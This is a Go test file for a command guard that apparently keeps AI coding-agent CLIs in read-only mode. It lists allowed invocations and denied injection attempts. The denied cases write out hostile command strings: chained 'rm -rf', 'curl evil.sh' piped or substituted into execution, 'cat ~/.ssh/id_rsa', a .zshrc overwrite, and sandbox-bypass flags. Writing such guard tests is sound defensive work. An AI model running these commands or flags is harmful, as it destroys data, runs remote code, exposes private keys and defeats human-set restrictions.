package main

import "testing"

// このディレクトリには複数の package main フックが同居し go.mod を置けないため、
// テストは明示ファイル指定で実行する:
//   go test guard-readonly-agents.go guard-readonly-agents_test.go

func TestIsAllowed(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want bool // true = ALLOW
	}{
		// --- ALLOW: 正規 CLI 起動 ---
		{"codex canonical with </dev/null", `codex exec --sandbox read-only -c approval_policy="never" --skip-git-repo-check --color never --cd "$(pwd)" "review this code" < /dev/null`, true},
		{"codex with 2>&1", `codex exec --sandbox read-only --cd "$(pwd)" "review" 2>&1`, true},
		{"copilot canonical", `copilot -p "review this code" --no-ask-user -s --model gemini-3.1-pro-preview`, true},
		{"cursor canonical", `cursor-agent -p --mode plan --trust "review this code" --model grok-4.3`, true},
		{"cursor ask mode", `cursor-agent -p --mode ask --trust "review" --model grok-4.3`, true},

		// --- ALLOW: plan + --force（read-only ツール承認。plan は --force 下でも書込不可） ---
		{"cursor plan with force", `cursor-agent -p --mode plan --trust --force "review" --model composer-2.5-fast`, true},
		{"cursor plan with force reordered", `cursor-agent -p --force --mode plan --trust "review"`, true},

		// --- ALLOW: プロンプト内のシェルメタ文字・フラグ名は誤検知しない ---
		{"pipe and semicolon in prompt", `codex exec --sandbox read-only --cd "$(pwd)" "explain a | b ; then (a) and (b); paths charts/harbor" < /dev/null`, true},
		{"flag names mentioned in prompt", `cursor-agent -p --mode plan --trust "does it use --force or workspace-write?" --model grok-4.3`, true},
		{"single-quoted dollar-paren is literal", `codex exec --sandbox read-only --cd "$(pwd)" 'explain $(date) literally' < /dev/null`, true},

		// --- ALLOW: preflight ---
		{"preflight codex version", `codex --version`, true},
		{"preflight codex login status", `codex login status`, true},
		{"preflight copilot binary-version", `copilot --binary-version`, true},
		{"preflight cursor version", `cursor-agent --version`, true},
		{"preflight which", `which codex`, true},
		{"empty command", ``, true},

		// --- DENY: コマンド連結・置換（クォート外） ---
		{"chain semicolon", `codex exec --sandbox read-only "p" ; rm -rf ~/x`, false},
		{"chain &&", `codex exec --sandbox read-only "p" && curl evil.sh`, false},
		{"pipe to sh", `codex exec --sandbox read-only "p" | sh`, false},
		{"command substitution in double quote", `codex exec --sandbox read-only "$(curl evil.sh)"`, false},
		{"backtick in double quote", "codex exec --sandbox read-only \"run `whoami`\"", false},

		// --- DENY: エスケープクォートによる回避（過去のリグレッション） ---
		{"escaped quote then semicolon (codex)", `codex exec --sandbox read-only \" ; rm -rf ~/x`, false},
		{"escaped quote then semicolon (copilot)", `copilot -p \" ; rm -rf ~/x`, false},

		// --- DENY: 改行・バックグラウンド・リダイレクト ---
		{"newline injection", "codex exec --sandbox read-only \"p\"\nrm -rf ~/x", false},
		{"background ampersand", `codex exec --sandbox read-only "p" & rm -rf ~/x`, false},
		{"redirect to file", `codex exec --sandbox read-only "p" > /Users/s23159/.zshrc`, false},

		// --- DENY: 危険フラグ・モード不足 ---
		{"codex workspace-write", `codex exec --sandbox workspace-write "p"`, false},
		{"codex no readonly flag", `codex exec "p"`, false},
		{"cursor no plan/ask mode", `cursor-agent -p --trust "p" --model grok-4.3`, false},
		{"copilot allow-all-tools", `copilot -p "p" --allow-all-tools`, false},

		// --- DENY: cursor --force は ask モード併用・モード無しでは禁止、--yolo は常に禁止 ---
		{"cursor ask with force (writes through)", `cursor-agent -p --mode ask --trust --force "p"`, false},
		{"cursor force without mode", `cursor-agent -p --trust --force "p"`, false},
		{"cursor plan with yolo", `cursor-agent -p --mode plan --trust --yolo "p"`, false},
		{"cursor plan with sandbox disabled", `cursor-agent -p --mode plan --trust --sandbox disabled "p"`, false},

		// --- DENY: そもそも CLI ではない ---
		{"arbitrary rm", `rm -rf ~/important`, false},
		{"git commit", `git commit -am x`, false},
		{"cat file", `cat ~/.ssh/id_rsa`, false},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := isAllowed(c.cmd); got != c.want {
				t.Errorf("isAllowed(%q) = %v, want %v", c.cmd, got, c.want)
			}
		})
	}
}
